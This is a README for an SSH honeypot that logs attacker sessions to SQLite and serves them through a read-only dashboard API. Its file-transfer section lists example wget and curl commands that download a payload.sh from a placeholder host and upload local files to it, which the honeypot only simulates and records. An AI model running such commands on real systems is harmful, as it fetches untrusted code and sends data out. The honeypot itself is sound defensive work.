# Panopticon

Panopticon is an SSH honeypot that simulates shell interactions, stores structured events in SQLite, and exposes a separate FastAPI service for historical queries and live event streaming. A React dashboard is planned.

## Quick Start

1. Clone the repository and change directory

`git clone git@github.com:bgr-github/Panopticon.git && cd Panopticon`

2. Create Docker container & generate SSH keys

```bash
docker compose build
docker compose run --rm ssh python -m panopticon.init_keys
docker compose up -d
```

This starts separate `ssh` and `api` containers built from the Dockerfile's named targets. They share the `ssh_data` SQLite volume. SSH is available on `127.0.0.1:2222`; the API is available on `127.0.0.1:8000` with interactive documentation at [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs).

3. Test the server

`ssh <username>@127.0.0.1 -p 2222`

4. To shut down both services
`docker compose down`

## Information

The honeypot currently accepts any password from any username. Ensure you use dummy credentials when testing as everything is stored in plain text.

Upon connecting to the server, the attacker will see a welcome banner and a shell prompt. The welcome banner will be updated down the line when I start working on the server realism.

## Event database

The SSH server creates `data/panopticon.sqlite3` and its schema automatically on startup. Python's built-in `sqlite3` module provides storage; no database server or Redis service is required. All event types, including simulated transfer attempts, are stored in the `events` table.

The collector receives an `EventStore` interface, and `SQLiteEventStore` implements database setup and persistence. A single asynchronous collector sends writes to a background thread, keeping database operations outside the SSH event loop. New storage implementations can be injected without changing the commands or SSH callbacks.

Configuration is available in `.env`:

```dotenv
PANOPTICON_DATABASE__PATH=data/panopticon.sqlite3
PANOPTICON_DATABASE__TIMEOUT=5
PANOPTICON_DATABASE__QUEUE_CAPACITY=1000
```

Paths are relative to the working directory unless absolute. The timeout controls how long a write waits for a database lock; queue capacity limits pending events. Start the server from the project root:

```bash
uv sync --locked
uv run python -m panopticon.init_keys
uv run python -m panopticon.honeypots.ssh.server
```

The table contains indexed `id`, `timestamp`, `session_id`, `src_ip`, `src_port` and `event_type` fields alongside the complete event JSON in `payload`. Indexes support time, session, source-IP and event-type queries; source port is stored but not separately indexed. Indexed timestamps use UTC, while the JSON preserves the original event fields. Replaying an existing ID leaves the stored event unchanged.

For example, run this query with a SQLite client:

```sql
SELECT timestamp, event_type, session_id, src_ip, payload
FROM events
ORDER BY timestamp DESC, id DESC
LIMIT 50;
```

In Docker, the database lives at `/app/data/panopticon.sqlite3` in the `ssh_data` named volume. `docker compose down` preserves it; `docker compose down -v` removes the volumes and their collected data. Existing Redis configuration is accepted for compatibility but unused.

SQLite uses WAL journalling and full commit synchronisation. Graceful shutdown closes SSH connections, records disconnect events and drains the writer. `EventHandler.publish()` accepts a snapshot into memory; it does not mean the event is committed yet. Queue overflow raises an error, and storage failures stop the writer and listening service rather than being reported as successful persistence. Pending events have no durable spool or automatic retry, so an abrupt crash or failed storage write can lose uncommitted events. Back up a running WAL database with SQLite's backup facility; copying only the main database file can omit recent commits.

## Dashboard API

Run the API locally in its own terminal, alongside the SSH service:

```bash
uv sync --locked
uv run python -m panopticon.api.server
```

The API creates the shared schema on startup if needed and can start independently of SSH. Request handlers use read-only SQLite connections; the SSH collector remains the event writer. Both local services must use the same `PANOPTICON_DATABASE__PATH` and working directory. Database work runs outside the API's event loop. There are no REST endpoints that change or delete captured events.

| Endpoint | Dashboard purpose |
| --- | --- |
| `GET /health` | Database readiness; returns 503 if queries fail |
| `GET /events` | Newest-first event history with cursor pagination |
| `GET /events/{event_id}` | Complete event payload |
| `GET /events/stream` | Live committed events using SSE |
| `GET /sessions` | Session summaries, counts and recorded lifecycle status |
| `GET /sessions/{session_id}` | One session summary; query `/events?session_id=...` for its events |
| `GET /stats/summary` | Event, session, source, login, command and transfer totals |
| `GET /stats/timeline` | Zero-filled minute/hour/day activity buckets in UTC |
| `GET /stats/top/{dimension}` | Ranked `src_ip`, `username`, `password` or `command` values |

Event history, SSE and statistics accept `event_type`, `src_ip` (IPv4 or IPv6), `src_port`, `session_id`, `start_time` and `end_time`. Times must include a timezone; the start is inclusive and the end is exclusive. Invalid filters return 422. History pages have a `limit` of 1–500 (default 50) and a `before_id` cursor. Pass the response's `next_cursor` as `before_id` to load the next page; a null cursor means there are no more matching rows. Events with equal timestamps are ordered by ID for stable pagination.

Session lists accept `limit`, `offset`, `src_ip` and `status=active|closed`. Summaries use complete recorded session histories. Active means an open event exists without a recorded close event; it is not an independent SSH process-health check, and abrupt crashes can leave sessions apparently active. Lists use descending last activity and session ID ordering. Offset pages can shift as live sessions change.

Timeline queries default to the last 24 hours with `interval=hour`. Supply `start_time` and `end_time` for a fixed chart window. Queries exceeding 1,000 buckets return 422. Ranking queries use `limit=1..50` (default 10). All totals describe the selected stored events, and transfer counts remain simulated attempts rather than completed transfers.

### Live stream and reconnects

The API polls committed SQLite rows every 0.5 seconds by default, independently of the SSH process. SSE events use insertion order, so late-arriving events with older timestamps are still delivered. Each frame has `event: event`, an event UUID in `id`, and the full JSON payload in `data`. Idle streams emit keepalive comments every 15 seconds and advertise a two-second reconnect delay. Batches contain at most 100 events; slow clients do not require an unbounded per-client queue or a long-lived database transaction.

A connection without a cursor starts at the current database tail. To bridge history and live data without a gap, fetch `/events`, then connect with its `stream_cursor` as `after_id`. The value `0` represents an empty database snapshot. Reconnecting clients can send `Last-Event-ID`, which takes precedence over the query cursor and resumes exclusively after the last received event. Clients should deduplicate by event UUID across reconnections. Unknown/expired cursors return 404; fetch history again to obtain a fresh cursor.

```javascript
const api = "http://127.0.0.1:8000";
const history = await fetch(`${api}/events?limit=50`).then(response => response.json());
const stream = new EventSource(`${api}/events/stream?after_id=${encodeURIComponent(history.stream_cursor)}`);

stream.addEventListener("event", message => {
    const event = JSON.parse(message.data);
    // Insert or update the dashboard event using event.id.
});

stream.addEventListener("stream_error", message => {
    // Storage became unavailable after streaming started; reconnect or refresh history.
    console.error(JSON.parse(message.data).detail);
});

// Call stream.close() when the dashboard unmounts.
```

Apply the same event filters to the history request and stream. The stream follows the append-only event table; future retention/deletion features will need their own cursor policy. Data is emitted only after a database commit, so events still queued by the collector are not visible yet. Database failures before streaming starts return 503; failures after response headers emit `stream_error` and close the stream.

CORS permits `http://localhost:5173` and `http://127.0.0.1:5173` by default. Configure the API with:

```dotenv
PANOPTICON_API__HOST=127.0.0.1
PANOPTICON_API__PORT=8000
PANOPTICON_API__CORS_ORIGINS='["http://localhost:5173","http://127.0.0.1:5173"]'
PANOPTICON_API__POLL_INTERVAL=0.5
PANOPTICON_API__HEARTBEAT_INTERVAL=15
```

Docker publishes the API only on the host loopback interface. It currently has no authentication and exposes captured credentials and commands; keep it restricted to operator access until authentication is added. CORS is a browser-origin policy, not an access-control boundary.

## File transfer attempts

The shell recognises `wget` downloads and `curl` downloads/uploads. Transfers are simulated: no network requests are made, no payloads are fetched or executed, and no virtual files are created or changed. The command response states that the attempt was recorded.

Direction is measured from the honeypot: fetching a remote URL is a download; sending a virtual file to a remote URL is an upload.

```bash
wget https://example.test/payload.sh
wget -qO /tmp/payload.sh https://example.test/payload.sh
curl -fsSL https://example.test/payload.sh -o /tmp/payload.sh
curl -T readme.txt https://example.test/upload
curl --data-binary @readme.txt https://example.test/upload
curl -F 'file=@readme.txt' https://example.test/upload
```

`FileDownloaded` and `FileUploaded` contain the original command, URL, filename, inferred MIME type, virtual path, method and connection metadata. Upload size is included when the source exists in the virtual filesystem; otherwise it is unknown. Download size is unknown because the content is never fetched. Every transfer event has `status="attempted"` and `simulated=true`; these events do not prove that a transfer completed. `FileDownload` and `FileUpload` remain aliases for the new class names.

Supported URLs use HTTP, HTTPS or FTP. `wget` supports multiple URLs, `-O`/`--output-document`, `-P`/`--directory-prefix`, and common quiet/continue flags. `curl` supports one URL, `-o`/`--output`, `-O`/`--remote-name`, `-T`/`--upload-file`, file-backed `--data`, `--data-binary`, and `-F`/`--form`, plus common `-fsSLk` flags. PUT and POST uploads are identified from the selected option; FTP uses the same direction categories. The method field describes the requested operation rather than an observed network exchange.

Quoted arguments are parsed without executing a host shell. Unsupported options and malformed requests return an error and retain their raw command event. Pipelines, shell scripts, SCP and SFTP are not implemented by these commands. MIME types are inferred from filenames rather than inspected file contents.



## Creating commands
You are more than welcome to create commands for Panopticon using the module template. The command handler will read all matching modules in the `honeypots/ssh/commands/` folder and load them into registry.

Here is the echo command as an example. Return type must be a `list[str]`, even if it is just one line.

- `NAME` - Name of the command. File name will be used if this is not present.
- `MAN` - Manual text for this command, should match Unix systems exactly. `man echo` for example.

```py
from panopticon.honeypots.ssh.context import SSHCommandContext

NAME = "echo"
MAN = "echo - display a line of text"


def run(ctx: SSHCommandContext) -> list[str]:
    return [" ".join(ctx.args)]
```

## Testing
To run tests use `uv run --locked pytest panopticon/tests -v`. SSH integration tests do not require Panopticon to be running in Docker to work.
